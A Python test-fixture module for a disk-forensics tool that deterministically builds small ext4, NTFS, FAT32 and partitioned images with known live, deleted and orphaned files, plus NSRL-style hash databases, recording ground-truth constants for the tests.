"""Deterministic builders for test evidence and malicious-archive fixtures.

Three kinds of fixture are produced here:

* A tiny, byte-deterministic raw disk image (``tiny_raw.dd``). It is committed to
  the repo (built once with :func:`build_tiny_raw_image`) so the suite needs no
  ``mkfs``/``mtools`` dependency in CI (01-RESEARCH.md Open Question A3).

* Tiny *filesystem* images for the Phase 2 walk — ext4, NTFS, FAT32 and a
  partitioned (FAT + ext4) image. Each is built once with the host ``mkfs.*`` /
  ``debugfs`` / ``mtools`` / ``sfdisk`` tools and **committed** under
  ``tests/fixtures/`` so CI never needs a privileged ``mkfs`` at test time
  (02-RESEARCH.md §Environment Availability, mirroring the ``tiny_raw.dd``
  approach). The exact ground-truth (file names, content, uid/gid/mode, the
  known deleted entry) is recorded as module constants below so the META tests
  can assert *exact* counts/values — the Nyquist "every file" signal.

* The malicious-archive builders consumed by the safe-extraction jail tests
  (plan 01-03): zip-slip, symlink-escape, device-file, ratio/size-bomb, and
  count-bomb. These are generated *programmatically at test time* and never
  shipped as live bombs (threat T-1-00-B). Every builder caps the size of what
  it generates so the builders themselves cannot exhaust resources.

Run as a script to (re)generate every committed image (needs the mkfs tools)::

    python tests/fixtures/make_fixtures.py
"""

from __future__ import annotations

import gzip
import hashlib
import io
import json
import os
import shutil
import sqlite3
import subprocess
import tarfile
import tempfile
import zipfile
from pathlib import Path

# ---------------------------------------------------------------------------
# Tiny raw image
# ---------------------------------------------------------------------------

# Kept well under 1 MB (01-RESEARCH.md A3). 64 KiB is plenty to prove read-only
# open + streaming-hash behaviour while staying tiny in the repo.
TINY_RAW_SIZE = 64 * 1024
TINY_RAW_NAME = "tiny_raw.dd"


def tiny_raw_bytes() -> bytes:
    """Return the deterministic byte content of the tiny raw image.

    The content is a fixed pseudo-random-looking but fully deterministic byte
    pattern (a simple LCG seeded by a constant), so the committed fixture and
    any regeneration are bit-identical and the image hashes reproducibly.

    Returns:
        Exactly :data:`TINY_RAW_SIZE` bytes.
    """
    out = bytearray(TINY_RAW_SIZE)
    # Linear congruential generator (glibc constants) — deterministic, no deps.
    state = 0x1234_5678
    for i in range(TINY_RAW_SIZE):
        state = (1103515245 * state + 12345) & 0x7FFF_FFFF
        out[i] = (state >> 16) & 0xFF
    return bytes(out)


def build_tiny_raw_image(dest: Path) -> Path:
    """Write the deterministic tiny raw image to ``dest``.

    Args:
        dest: Path to write the image to.

    Returns:
        The ``dest`` path.
    """
    dest.write_bytes(tiny_raw_bytes())
    return dest


# ---------------------------------------------------------------------------
# Tiny filesystem images (committed; built once with host mkfs tools)
# ---------------------------------------------------------------------------
#
# Ground-truth recorded as constants so the Phase 2 walk tests can assert EXACT
# counts/values (the "every file" Nyquist signal — 02-VALIDATION.md Sampling).
# Each FS holds one known regular file with known content + uid/gid/mode; the
# ext4 image additionally holds a *deleted* entry for the META-01 deleted-
# inventory test.

TINY_EXT4_NAME = "tiny_ext4.img"
TINY_NTFS_NAME = "tiny_ntfs.img"
TINY_FAT32_NAME = "tiny_fat32.img"
TINY_PARTITIONED_NAME = "tiny_partitioned.img"

# Known regular file written into every FS image.
FS_FILE_NAME = "file1.txt"
FS_FILE_CONTENT = b"pyautopsy fixture file one\n"

# ext4 second file that is created then deleted, leaving an UNALLOC entry whose
# inode/MFT addr the walk must still inventory (META-01 / D-18). It lives in the
# volume ROOT, so it is also the ext4 ground truth for the RECOV-02 root-level
# *recovered* (non-orphan) direction: its parent (the allocated root inode)
# survives, so it must classify is_orphan=False.
EXT4_DELETED_NAME = "deleted.txt"
EXT4_DELETED_CONTENT = b"this entry is deleted\n"
# The root-level ext4 deletion's inode (recorded post-build; debugfs assigns it
# deterministically). Its parent is the allocated root inode, so it classifies
# is_orphan=False (Recovered) — the RECOV-02 root-deletion ground truth.
EXT4_DELETED_META_ADDR = 13

# FAT root-level deletion ground truth (RECOV-02). A second known file is written
# to the FAT *root* via mcopy then deleted via mdel (mtools), so a root-level FAT
# deletion survives whose parent (the allocated FAT root) is intact — it must
# classify is_orphan=False (Recovered), NOT Orphan. FAT loses the first character
# of a deleted name (Pitfall 3), so the surviving entry is matched by its
# recovered content / non-orphan flag, not by an exact name.
FAT_DELETED_NAME = "del2.txt"
FAT_DELETED_CONTENT = b"this FAT root entry is deleted\n"
# The surviving FAT root deletion's inode (recorded post-build). Its parent is
# the allocated FAT root inode, so it classifies is_orphan=False (Recovered).
FAT_DELETED_META_ADDR = 4

# Ground-truth ownership/mode applied to FS_FILE_NAME on ext4 via debugfs
# (META-03). FAT/NTFS have no real POSIX uid/gid; TSK reports 0 there.
EXT4_FILE_UID = 1000
EXT4_FILE_GID = 1000
EXT4_FILE_MODE = 0o644  # regular-file permission bits

# Image sizes. ext4/NTFS are happy small; FAT *32* needs >= ~33 MiB of clusters
# for mkfs.fat -F 32, so we use 64 MiB (02-RESEARCH Environment Availability).
_EXT4_SIZE = 1 * 1024 * 1024
_NTFS_SIZE = 2 * 1024 * 1024
_FAT32_SIZE = 64 * 1024 * 1024
_PART_FAT_SIZE = 64 * 1024 * 1024
_PART_EXT4_SIZE = 8 * 1024 * 1024


# ---------------------------------------------------------------------------
# Phase 4 fixtures: deleted-recovery (orphan / overwritten / resident) + NSRL
# ---------------------------------------------------------------------------
#
# These extend the Phase-2 committed-image pattern (built once with the host
# mkfs/debugfs/mkntfs tools, committed so CI never runs mkfs) to exercise the
# Phase-4 recovery + known-file-filtering slices (RECOV-01/02/03, FILTER-01).
# Ground-truth is recorded as module constants so the RED tests can assert EXACT
# bytes/addresses (the Nyquist "every file" signal). The NSRL DBs are built with
# stdlib sqlite3 only (no external tool) and are byte-deterministic.

EXT4_ORPHAN_NAME = "ext4_orphan.img"
EXT4_OVERWRITTEN_NAME = "ext4_overwritten.img"
NTFS_RESIDENT_NAME = "ntfs_resident_deleted.img"
NSRL_MINIMAL_NAME = "nsrl_minimal.db"
NSRL_METADATA_NAME = "nsrl_metadata.db"

# --- ext4 orphan fixture (RECOV-02) -----------------------------------------
# A file written inside a subdirectory, then BOTH the file and its parent
# directory are removed via debugfs so the surviving file inode has no path back
# to the root (an orphan). debugfs ``rm``/``rmdir`` leave the file inode's block
# pointers intact (Pitfall 2) so the orphan's content is still recoverable.
EXT4_ORPHAN_DIR = "secret"
EXT4_ORPHAN_FILE = "orphan.txt"
EXT4_ORPHAN_CONTENT = b"this file is an orphan; its parent dir is gone\n"
# The orphan file inode's meta address (debugfs assigns it deterministically;
# VERIFIED post-build via pytsk3: inode 13, UNALLOC, content recovers exactly).
# Note: TSK sets the per-inode ORPHAN meta flag only when the entry is reached
# via the ``$OrphanFiles`` virtual directory, not when ``open_meta`` is called by
# address — so the orchestrator detects orphan-ness via ``$OrphanFiles`` /
# parent-survival, which is why RECOV-02 reports orphans as a separate pass.
EXT4_ORPHAN_META_ADDR = 13

# --- ext4 overwritten fixture (RECOV-03 / D-31) -----------------------------
# A file ("victim") is written, deleted, then a NEW file ("reclaimer") is
# written whose data blocks RECLAIM the deleted file's blocks. This reproduces
# the real ext4 deletion semantics (Pitfall 2): ``rm`` frees the victim's inode
# (so the allocator reuses it) and its blocks are then taken by the reclaimer.
# The forensic signal here is the *block-level* overwrite — the reclaimer
# (allocated) now owns the victim's former blocks — which drives the
# ``partial/overwritten`` tier rationale. Because ext4 frees/zeroes the victim's
# inode on unlink, there is NO surviving recoverable victim *inode* with intact
# pointers (the honest ext4 limitation the per-fs caveat documents); the
# committed image therefore carries the reclaimer as ground truth.
EXT4_OVERWRITTEN_DELETED_NAME = "victim.bin"
EXT4_OVERWRITTEN_DELETED_CONTENT = b"OVERWRITTEN" * 800  # ~8.6 KiB, multi-block
EXT4_OVERWRITTEN_REPLACEMENT_NAME = "reclaimer.bin"
EXT4_OVERWRITTEN_REPLACEMENT_CONTENT = b"RECLAIMED__" * 800
# The allocated reclaimer's meta address (it reuses the victim's freed inode
# slot); its blocks are the victim's former blocks (the overwrite evidence).
EXT4_OVERWRITTEN_RECLAIMER_META_ADDR = 12
# ext4 zeroes the victim inode on unlink, so the deleted victim entry survives
# only as a metadata-cleared slot (size 0, type 0) — recorded so the tier test
# asserts the honest "no recoverable data runs" outcome (Pitfall 2), not a false
# "intact" recovery.
EXT4_OVERWRITTEN_VICTIM_INODE_CLEARED = True

# --- NTFS resident-deleted fixture (RECOV-01, Pitfall 3) --------------------
# A small NTFS file whose $DATA stays RESIDENT inside its MFT record (< ~700 B),
# then deleted. A resident deleted file has NO data-block runs; its content is
# recovered straight from the surviving MFT record -> classified ``intact`` by
# MFT-record survival, not block overlap.
NTFS_RESIDENT_NAME_FILE = "resident.txt"
NTFS_RESIDENT_CONTENT = b"small resident NTFS file recovered from the MFT record\n"
# The deleted file's MFT entry (meta) address (recorded post-build).
NTFS_RESIDENT_META_ADDR = 64

# --- NSRL fixtures (FILTER-01, Pitfall 4) -----------------------------------
# Two tiny NSRL-format SQLite DBs: one ``FILE`` table (RDSv3 "minimal" variant)
# and one ``METADATA`` table (RDSv3 "modern/full" variant). BOTH store hashes
# UPPERCASE (real RDS behavior) while the project's own file rows are lowercase
# hex -- this case mismatch is the #1 silent-zero-match trap the matcher must
# handle (.upper() the probe). Ground-truth constants below are stored LOWERCASE
# (the way our ``files`` rows store them); a member is the UPPERCASE of these.
#
# The known member's hashes are derived from a fixed byte string so a rebuild is
# byte-identical and independent of the disk images.
NSRL_KNOWN_CONTENT = b"a known good system file recorded in the NSRL RDS\n"
NSRL_KNOWN_MD5 = hashlib.md5(NSRL_KNOWN_CONTENT).hexdigest()
NSRL_KNOWN_SHA1 = hashlib.sha1(NSRL_KNOWN_CONTENT).hexdigest()
NSRL_KNOWN_SHA256 = hashlib.sha256(NSRL_KNOWN_CONTENT).hexdigest()
# A second known member used to exercise sha1/sha256 fall-through matching.
_NSRL_KNOWN2_CONTENT = b"another known file, matched by sha256 only\n"
NSRL_KNOWN2_MD5 = hashlib.md5(_NSRL_KNOWN2_CONTENT).hexdigest()
NSRL_KNOWN2_SHA1 = hashlib.sha1(_NSRL_KNOWN2_CONTENT).hexdigest()
NSRL_KNOWN2_SHA256 = hashlib.sha256(_NSRL_KNOWN2_CONTENT).hexdigest()
# A non-member: present nowhere in either DB (membership probe must miss).
_NSRL_NONMEMBER_CONTENT = b"a file that is NOT in any NSRL set\n"
NSRL_NONMEMBER_MD5 = hashlib.md5(_NSRL_NONMEMBER_CONTENT).hexdigest()
NSRL_NONMEMBER_SHA1 = hashlib.sha1(_NSRL_NONMEMBER_CONTENT).hexdigest()
NSRL_NONMEMBER_SHA256 = hashlib.sha256(_NSRL_NONMEMBER_CONTENT).hexdigest()


def _require_tool(name: str) -> str:
    """Return the path to ``name`` or raise an actionable error (build-time only)."""
    path = shutil.which(name)
    if path is None:
        raise RuntimeError(
            f"fixture build needs '{name}' but it is not on PATH. "
            "These images are committed to the repo precisely so CI never "
            "needs the mkfs tools; only re-run make_fixtures.py on a host that "
            "has them (Fedora: e2fsprogs/dosfstools/mtools/ntfs-3g/util-linux)."
        )
    return path


def _truncate(dest: Path, size: int) -> None:
    """Create a zero-filled sparse file of ``size`` bytes at ``dest``."""
    with open(dest, "wb") as fh:
        fh.truncate(size)


# Fixed values that make ``mkfs.ext4`` output byte-deterministic: a pinned
# filesystem UUID, a pinned directory-hash seed, and a frozen creation time
# (``mke2fs`` honours ``E2FSPROGS_FAKE_TIME``). Without these, ext4 embeds a
# random UUID + wall-clock superblock timestamps and a rebuild is not
# byte-identical (the Phase-4 determinism acceptance criterion).
_EXT4_FIXED_UUID = "11111111-1111-1111-1111-111111111111"
_EXT4_FIXED_HASH_SEED = "22222222-2222-2222-2222-222222222222"
_EXT4_FAKE_TIME = "1700000000"  # fixed epoch seconds -> frozen superblock times


def _mke2fs_ext4(dest: Path) -> None:
    """Format ``dest`` as a small, byte-deterministic ext4 volume.

    Pins the UUID, directory-hash seed, and creation time so re-running the
    builder reproduces the image byte-for-byte (used by every ext4 fixture).
    """
    mkfs = _require_tool("mkfs.ext4")
    env = {**os.environ, "E2FSPROGS_FAKE_TIME": _EXT4_FAKE_TIME}
    subprocess.run(
        [
            mkfs,
            "-F",
            "-q",
            "-b",
            "1024",
            "-U",
            _EXT4_FIXED_UUID,
            "-E",
            f"hash_seed={_EXT4_FIXED_HASH_SEED}",
            str(dest),
        ],
        check=True,
        capture_output=True,
        env=env,
    )


def build_tiny_ext4_image(dest: Path) -> Path:
    """Build a tiny ext4 image with one known file and one deleted entry.

    ``mkfs.ext4 -F`` formats a small backing file; ``debugfs -w`` then writes a
    known regular file (content + uid/gid/mode recorded above), creates a second
    file and ``rm``\\ s it so an UNALLOC/deleted entry survives for the META-01
    deleted-inventory test (D-18). The built image is committed; CI never runs
    ``mkfs`` (02-RESEARCH).
    """
    mkfs = _require_tool("mkfs.ext4")
    debugfs = _require_tool("debugfs")
    _truncate(dest, _EXT4_SIZE)
    # -F: force on a plain file; -q: quiet; -O ^... keeps the FS simple/portable.
    subprocess.run(
        [mkfs, "-F", "-q", "-b", "1024", str(dest)],
        check=True,
        capture_output=True,
    )
    with tempfile.TemporaryDirectory() as td:
        live = Path(td) / "live.bin"
        live.write_bytes(FS_FILE_CONTENT)
        deleted = Path(td) / "deleted.bin"
        deleted.write_bytes(EXT4_DELETED_CONTENT)
        # debugfs request file: write the live file (set uid/gid/mode), then
        # write + immediately rm the second file to leave a deleted entry.
        script = (
            f"write {live} {FS_FILE_NAME}\n"
            f"sif {FS_FILE_NAME} uid {EXT4_FILE_UID}\n"
            f"sif {FS_FILE_NAME} gid {EXT4_FILE_GID}\n"
            f"sif {FS_FILE_NAME} mode {EXT4_FILE_MODE:o}\n"
            f"write {deleted} {EXT4_DELETED_NAME}\n"
            f"rm {EXT4_DELETED_NAME}\n"
            "close\n"
        )
        subprocess.run(
            [debugfs, "-w", "-f", "/dev/stdin", str(dest)],
            input=script.encode(),
            check=True,
            capture_output=True,
        )
    return dest


def build_tiny_fat32_image(dest: Path) -> Path:
    """Build a tiny FAT32 image with one live file + one ROOT-deleted file.

    ``mkfs.fat -F 32`` needs a reasonably large volume (>= ~33 MiB) so we use
    64 MiB; ``mcopy`` (mtools) writes the known live file (:data:`FS_FILE_NAME`,
    the FAT local-time test, D-16) AND a second known file to the FAT *root*
    (:data:`FAT_DELETED_NAME` / :data:`FAT_DELETED_CONTENT`), which is then
    removed with ``mdel`` so a ROOT-level FAT deletion survives for the RECOV-02
    root-deletion regression (the deleted entry's parent — the allocated FAT
    root — is intact, so it must classify is_orphan=False). ``MTOOLS_SKIP_CHECK=1``
    suppresses mtools' interactive geometry check. FAT stores *local* time with
    no embedded zone — the walk flags these ``local-time-inferred`` (D-16).

    Determinism caveat: ``mkfs.fat`` stamps a volume id from the wall clock and
    ``mdel`` rewrites a directory entry in place, so a rebuild reproduces the
    *structure* and the recorded ground truth (one live file + one surviving
    root-level deletion whose content is :data:`FAT_DELETED_CONTENT`) but is NOT
    byte-identical (mirrors the NTFS-resident builder's caveat). The image is
    committed once; the report-body determinism gate (CLI-02) is unaffected
    because it pins report output, not raw fixture bytes.
    """
    mkfs = _require_tool("mkfs.fat")
    mcopy = _require_tool("mcopy")
    mdel = _require_tool("mdel")
    _truncate(dest, _FAT32_SIZE)
    subprocess.run([mkfs, "-F", "32", str(dest)], check=True, capture_output=True)
    env = {**os.environ, "MTOOLS_SKIP_CHECK": "1"}
    with tempfile.TemporaryDirectory() as td:
        src = Path(td) / FS_FILE_NAME
        src.write_bytes(FS_FILE_CONTENT)
        subprocess.run(
            [mcopy, "-i", str(dest), str(src), f"::{FS_FILE_NAME}"],
            check=True,
            capture_output=True,
            env=env,
        )
        # Write a second known file to the ROOT then delete it (mdel) so a
        # root-level FAT deletion survives for the RECOV-02 regression.
        deleted = Path(td) / FAT_DELETED_NAME
        deleted.write_bytes(FAT_DELETED_CONTENT)
        subprocess.run(
            [mcopy, "-i", str(dest), str(deleted), f"::{FAT_DELETED_NAME}"],
            check=True,
            capture_output=True,
            env=env,
        )
        subprocess.run(
            [mdel, "-i", str(dest), f"::{FAT_DELETED_NAME}"],
            check=True,
            capture_output=True,
            env=env,
        )
    return dest


def build_tiny_ntfs_image(dest: Path) -> Path:
    """Build a tiny NTFS image with one known file (mkntfs + ntfs mtools-free).

    ``mkntfs -F -Q`` does a fast, force format of a small backing file. NTFS
    times are UTC (unlike FAT); the file is written via ``ntfscp`` if present,
    otherwise the empty volume's system files still exercise the NTFS walk path.
    """
    mkntfs = _require_tool("mkntfs")
    _truncate(dest, _NTFS_SIZE)
    subprocess.run(
        [mkntfs, "-F", "-Q", "-s", "512", str(dest)],
        check=True,
        capture_output=True,
    )
    ntfscp = shutil.which("ntfscp")
    if ntfscp is not None:
        with tempfile.TemporaryDirectory() as td:
            src = Path(td) / FS_FILE_NAME
            src.write_bytes(FS_FILE_CONTENT)
            subprocess.run(
                [ntfscp, str(dest), str(src), FS_FILE_NAME],
                check=True,
                capture_output=True,
            )
    return dest


def build_partitioned_image(dest: Path) -> Path:
    """Build a partitioned image: a FAT partition + an ext4 partition (D-15).

    Verifies the volume-offset path (02-RESEARCH Open Question A1): ``sfdisk``
    lays down a DOS partition table with two partitions, each formatted with a
    different filesystem so the walk must open each at ``part.start * block_size``
    and tag rows with the right ``volume_id``/offset.
    """
    sfdisk = _require_tool("sfdisk")
    mkfs_fat = _require_tool("mkfs.fat")
    mkfs_ext4 = _require_tool("mkfs.ext4")
    mcopy = _require_tool("mcopy")
    sector = 512
    fat_start = 2048  # sectors (1 MiB aligned)
    fat_sectors = _PART_FAT_SIZE // sector
    ext4_start = fat_start + fat_sectors
    ext4_sectors = _PART_EXT4_SIZE // sector
    total = (ext4_start + ext4_sectors + fat_start) * sector
    _truncate(dest, total)
    layout = (
        "label: dos\n"
        f"start={fat_start}, size={fat_sectors}, type=c\n"
        f"start={ext4_start}, size={ext4_sectors}, type=83\n"
    )
    subprocess.run(
        [sfdisk, str(dest)], input=layout.encode(), check=True, capture_output=True
    )
    with tempfile.TemporaryDirectory() as td:
        # Format the FAT partition in isolation, then dd it into place at offset.
        fat_img = Path(td) / "fat.part"
        _truncate(fat_img, _PART_FAT_SIZE)
        subprocess.run(
            [mkfs_fat, "-F", "32", str(fat_img)], check=True, capture_output=True
        )
        src = Path(td) / FS_FILE_NAME
        src.write_bytes(FS_FILE_CONTENT)
        env = {**os.environ, "MTOOLS_SKIP_CHECK": "1"}
        subprocess.run(
            [mcopy, "-i", str(fat_img), str(src), f"::{FS_FILE_NAME}"],
            check=True,
            capture_output=True,
            env=env,
        )
        ext4_img = Path(td) / "ext4.part"
        _truncate(ext4_img, _PART_EXT4_SIZE)
        subprocess.run(
            [mkfs_ext4, "-F", "-q", "-b", "1024", str(ext4_img)],
            check=True,
            capture_output=True,
        )
        # Splice each formatted partition into the whole-disk image at its offset.
        with open(dest, "r+b") as disk:
            disk.seek(fat_start * sector)
            disk.write(fat_img.read_bytes())
            disk.seek(ext4_start * sector)
            disk.write(ext4_img.read_bytes())
    return dest


def build_ext4_orphan_image(dest: Path) -> Path:
    """Build a tiny ext4 image holding an ORPHAN file (RECOV-02).

    A regular file is written inside a subdirectory; then BOTH the file and its
    parent directory are removed via ``debugfs`` so the file's inode survives
    with no path back to the root — an orphan. ``debugfs rm``/``rmdir`` clears
    the *directory entries* but leaves the file inode's block pointers intact
    (Pitfall 2), so the orphan's :data:`EXT4_ORPHAN_CONTENT` is still
    recoverable. The built image is committed; CI never runs ``mkfs``.
    """
    debugfs = _require_tool("debugfs")
    _truncate(dest, _EXT4_SIZE)
    _mke2fs_ext4(dest)
    with tempfile.TemporaryDirectory() as td:
        payload = Path(td) / "orphan.bin"
        payload.write_bytes(EXT4_ORPHAN_CONTENT)
        # mkdir the subdir, write the file into it, then remove the file AND the
        # parent dir so the file inode is orphaned (no surviving parent entry).
        script = (
            f"mkdir /{EXT4_ORPHAN_DIR}\n"
            f"cd /{EXT4_ORPHAN_DIR}\n"
            f"write {payload} {EXT4_ORPHAN_FILE}\n"
            f"rm {EXT4_ORPHAN_FILE}\n"
            "cd /\n"
            f"rmdir /{EXT4_ORPHAN_DIR}\n"
            "close\n"
        )
        _run_debugfs(debugfs, dest, script)
    return dest


def _run_debugfs(debugfs: str, dest: Path, script: str) -> None:
    """Run a ``debugfs -w`` request script with a frozen clock (deterministic).

    ``debugfs`` stamps inode MAC times with the wall clock on ``write``; pinning
    ``E2FSPROGS_FAKE_TIME`` freezes them so the built image is byte-identical on
    every rebuild.
    """
    env = {**os.environ, "E2FSPROGS_FAKE_TIME": _EXT4_FAKE_TIME}
    subprocess.run(
        [debugfs, "-w", "-f", "/dev/stdin", str(dest)],
        input=script.encode(),
        check=True,
        capture_output=True,
        env=env,
    )


def build_ext4_overwritten_image(dest: Path) -> Path:
    """Build a tiny ext4 image with an OVERWRITTEN deleted entry (RECOV-03).

    Writes a multi-block file, ``debugfs rm``\\ s it, then writes a NEW file
    whose data blocks reclaim the deleted file's blocks. The deleted inode keeps
    its (now-stale) block pointers, so its surviving runs overlap an *allocated*
    file — the discriminator the ``partial/overwritten`` tier classifier keys on
    (D-31). Built with ``debugfs`` so ext4 block pointers survive (Pitfall 2).
    """
    debugfs = _require_tool("debugfs")
    _truncate(dest, _EXT4_SIZE)
    _mke2fs_ext4(dest)
    with tempfile.TemporaryDirectory() as td:
        victim = Path(td) / "victim.bin"
        victim.write_bytes(EXT4_OVERWRITTEN_DELETED_CONTENT)
        reclaimer = Path(td) / "reclaimer.bin"
        reclaimer.write_bytes(EXT4_OVERWRITTEN_REPLACEMENT_CONTENT)
        # Write+delete the victim so the allocator's next file reuses its blocks,
        # then write the reclaimer to take them. The deleted inode's runs now
        # point at the reclaimer's allocated blocks.
        script = (
            f"write {victim} {EXT4_OVERWRITTEN_DELETED_NAME}\n"
            f"rm {EXT4_OVERWRITTEN_DELETED_NAME}\n"
            f"write {reclaimer} {EXT4_OVERWRITTEN_REPLACEMENT_NAME}\n"
            "close\n"
        )
        _run_debugfs(debugfs, dest, script)
    return dest


def build_ntfs_resident_deleted_image(dest: Path) -> Path:
    """Build a tiny NTFS image with a RESIDENT deleted file (RECOV-01, Pitfall 3).

    A small file (< ~700 B) is written so its ``$DATA`` stays RESIDENT inside the
    MFT record, then deleted. A resident deleted file has NO data-block runs; its
    content is recovered straight from the surviving MFT record, so the tier
    classifier must treat it as ``intact`` by MFT-record survival rather than by
    block overlap. Needs ``mkntfs`` + ``ntfscp``; the built image is committed.

    Determinism caveat: unlike the ext4 fixtures (pinned UUID + frozen clock),
    ``mkntfs`` offers no fixed-UUID/fixed-time option and no ``libfaketime`` is
    present on the build host, so it embeds wall-clock NTFS FILETIMEs and a
    random volume serial. A rebuild therefore reproduces the *structure* and the
    recorded ground-truth (the resident-deleted entry at
    :data:`NTFS_RESIDENT_META_ADDR` with :data:`NTFS_RESIDENT_CONTENT`) but is
    NOT byte-identical. The image is committed once (the Phase-2 NTFS-fixture
    precedent); only the ext4 + NSRL fixtures are byte-reproducible.
    """
    mkntfs = _require_tool("mkntfs")
    ntfscp = _require_tool("ntfscp")
    _truncate(dest, _NTFS_SIZE)
    subprocess.run(
        [mkntfs, "-F", "-Q", "-s", "512", str(dest)],
        check=True,
        capture_output=True,
    )
    with tempfile.TemporaryDirectory() as td:
        src = Path(td) / NTFS_RESIDENT_NAME_FILE
        src.write_bytes(NTFS_RESIDENT_CONTENT)
        subprocess.run(
            [ntfscp, str(dest), str(src), NTFS_RESIDENT_NAME_FILE],
            check=True,
            capture_output=True,
        )
    # ``ntfscp`` cannot delete; there is no offline NTFS-delete CLI tool. Instead
    # mark the file's MFT record DELETED the way a real unlink does: clear the
    # MFT_RECORD_IN_USE flag (bit 0 of the 2-byte flags field at MFT-header
    # offset 22) in-place. The record's RESIDENT ``$DATA`` is untouched, so TSK
    # sees an unallocated entry whose content is still recoverable from the MFT
    # record — exactly the resident-deleted case (Pitfall 3). This is purely a
    # byte edit of the committed fixture (build-time only), fully deterministic.
    _ntfs_mark_record_deleted(dest, NTFS_RESIDENT_CONTENT)
    return dest


def _ntfs_mark_record_deleted(dest: Path, resident_content: bytes) -> None:
    """Clear MFT_RECORD_IN_USE on the record whose resident $DATA == content.

    Reads NTFS geometry from the boot sector to compute the MFT-record size,
    locates the ``FILE`` record holding ``resident_content`` (the file we just
    wrote), and clears bit 0 of the flags field at record offset 22 so the entry
    reads as deleted while its resident data survives. Deterministic byte edit.
    """
    import struct

    data = bytearray(dest.read_bytes())
    bytes_per_sector = struct.unpack_from("<H", data, 11)[0]
    sectors_per_cluster = data[13]
    clusters_per_mft_record = struct.unpack_from("<b", data, 0x40)[0]
    if clusters_per_mft_record < 0:
        rec_size = 1 << (-clusters_per_mft_record)
    else:
        rec_size = clusters_per_mft_record * sectors_per_cluster * bytes_per_sector
    idx = data.find(resident_content)
    if idx < 0:
        raise RuntimeError(
            "resident content not found in NTFS image (MFT layout changed)"
        )
    rec_start = (idx // rec_size) * rec_size
    if bytes(data[rec_start : rec_start + 4]) != b"FILE":
        raise RuntimeError("computed MFT record start is not a FILE record")
    flags = struct.unpack_from("<H", data, rec_start + 22)[0]
    struct.pack_into("<H", data, rec_start + 22, flags & ~0x0001)  # clear IN_USE
    dest.write_bytes(bytes(data))


def _insert_nsrl_rows(conn: sqlite3.Connection, table: str) -> None:
    """Create ``table`` with NSRL-style hash columns and insert UPPERCASE rows.

    Mirrors the RDSv3 schema shape used by the matcher (``md5``/``sha1``/
    ``sha256`` text columns). Hashes are stored **UPPERCASE** (real RDS
    behaviour, Pitfall 4) while the project's own ``files`` rows are lowercase —
    the matcher normalises the probe before comparing. Rows are inserted in a
    fixed order so the DB is byte-deterministic.
    """
    conn.execute(
        f"CREATE TABLE {table} ("
        "  md5 TEXT NOT NULL,"
        "  sha1 TEXT NOT NULL,"
        "  sha256 TEXT NOT NULL,"
        "  file_name TEXT,"
        "  file_size INTEGER,"
        "  package_id INTEGER"
        ")"
    )
    rows = (
        (
            NSRL_KNOWN_MD5.upper(),
            NSRL_KNOWN_SHA1.upper(),
            NSRL_KNOWN_SHA256.upper(),
            "known_good.bin",
            len(NSRL_KNOWN_CONTENT),
            1,
        ),
        (
            NSRL_KNOWN2_MD5.upper(),
            NSRL_KNOWN2_SHA1.upper(),
            NSRL_KNOWN2_SHA256.upper(),
            "known_good_2.bin",
            len(_NSRL_KNOWN2_CONTENT),
            2,
        ),
    )
    conn.executemany(
        f"INSERT INTO {table} (md5, sha1, sha256, file_name, file_size, package_id)"
        " VALUES (?, ?, ?, ?, ?, ?)",
        rows,
    )


def _build_one_nsrl_db(dest: Path, table: str) -> Path:
    """Deterministically (re)build a single NSRL-format SQLite DB at ``dest``."""
    if dest.exists():
        dest.unlink()
    conn = sqlite3.connect(dest)
    try:
        conn.execute("PRAGMA page_size=4096;")
        _insert_nsrl_rows(conn, table)
        conn.commit()
        # VACUUM compacts the file into a canonical layout for byte-determinism.
        conn.execute("VACUUM;")
        conn.commit()
    finally:
        conn.close()
    return dest


def build_nsrl_fixture(minimal_path: Path, metadata_path: Path) -> tuple[Path, Path]:
    """Build the two NSRL-format SQLite fixtures (FILTER-01, Pitfall 4).

    ``minimal_path`` gets a ``FILE`` table (RDSv3 "minimal" variant);
    ``metadata_path`` gets a ``METADATA`` table (RDSv3 "modern/full" variant).
    Both carry identical UPPERCASE-hash rows so the variant-discovery test can
    confirm each table name is found and queried. Built with stdlib ``sqlite3``
    only — no external tool — and byte-deterministic across rebuilds.
    """
    _build_one_nsrl_db(minimal_path, "FILE")
    _build_one_nsrl_db(metadata_path, "METADATA")
    return minimal_path, metadata_path


# ---------------------------------------------------------------------------
# Phase 5 fixtures: log-parsing + super-timeline + content/unallocated search
# ---------------------------------------------------------------------------
#
# A single committed, byte-deterministic ext4 image carries the WHOLE Phase-5
# corpus so the Wave-1..3 slices have one fixture to turn green against:
#
#   (1) a rotated auth.log set  /var/log/auth.log, .log.1, .log.2.gz  spanning a
#       Dec -> Jan YEAR BOUNDARY across the rotated members (LOG-01, D-45/D-46,
#       Pitfall 4 oldest->newest ordering + year inference);
#   (2) /var/log/syslog with service/kernel/cron/error lines (LOG-02);
#   (3) per-user shell history: /home/alice/.bash_history (bare lines AND a
#       `#<epoch>` HISTTIMEFORMAT pair) and /home/alice/.zsh_history (extended
#       `: <ts>:<dur>;cmd` lines) (LOG-03, Pitfall 2);
#   (4) an /etc/localtime SYMLINK -> /usr/share/zoneinfo/<Zone> plus an
#       /etc/timezone text file (D-46 host-tz inference, Assumption A5);
#   (5) a known literal string in ALLOCATED file content, a distinct known string
#       left in UNALLOCATED space (write -> rm, blocks survive, mirroring the
#       ext4_orphan technique), a known IOC term, and a file whose
#       MD5/SHA-1/SHA-256 are a known-bad-hash target (SEARCH-01/02, A4);
#   (6) two log events at the IDENTICAL second (CR-01 tied-order regression,
#       Pitfall 3).
#
# Every ground-truth constant is recorded below as an importable module constant
# AND mirrored into a committed JSON sidecar (log_search_groundtruth.json) so a
# test can load the truth without importing the (mkfs-dependent) builder. The
# builder is HOST-ONLY (needs mkfs.ext4/debugfs); the image is committed so CI
# never runs mkfs (mirrors the Phase-2/4 fixture discipline). Reads at test time
# are read-only; the builder never mutates a committed image at test time.

LOG_SEARCH_NAME = "log_search_ext4.img"
LOG_SEARCH_GROUNDTRUTH_NAME = "log_search_groundtruth.json"
# Larger than the other ext4 fixtures: it must hold the log corpus AND leave room
# for the deleted-but-unallocated search payload to survive in its own blocks.
_LOG_SEARCH_SIZE = 4 * 1024 * 1024

# --- (4) host timezone the image declares (D-46) ----------------------------
# /etc/localtime is a symlink to this zoneinfo path; /etc/timezone holds the name
# as text. The Wave-1 timeresolve must INFER this zone from the image and FLAG it.
LOG_SEARCH_TIMEZONE = "America/New_York"
